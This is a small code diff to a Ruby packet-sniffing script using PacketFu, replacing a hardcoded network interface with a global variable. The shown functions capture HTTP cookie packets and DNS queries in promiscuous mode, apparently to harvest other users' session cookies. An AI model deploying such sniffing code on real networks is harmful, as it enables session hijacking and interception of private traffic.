@@ -18,8 +18,7 @@ end
 # sniff the traffic and capture the cookie packets, and dump them to a file
 def cookie_grabber()
   puts "Waiting for cookies............:"
-  iface = "em1"
-  capture_session = PacketFu::Capture.new(:iface => iface, :start => true, :promisc => true,
+  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true,
 	:filter => "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)")
 
   capture_session.stream.each { |packet|
@@ -36,7 +35,6 @@ end
 
 def dns_grabber()
   puts "Waiting for queries:"
-  iface = "em1"
-  capture_session = PacketFu::Capture.new(:iface => iface, :start => true, :promisc => true, :filter => "udp and port 53", :save => true)
+  capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => "udp and port 53", :save => true)
   puts "got one!"
 end
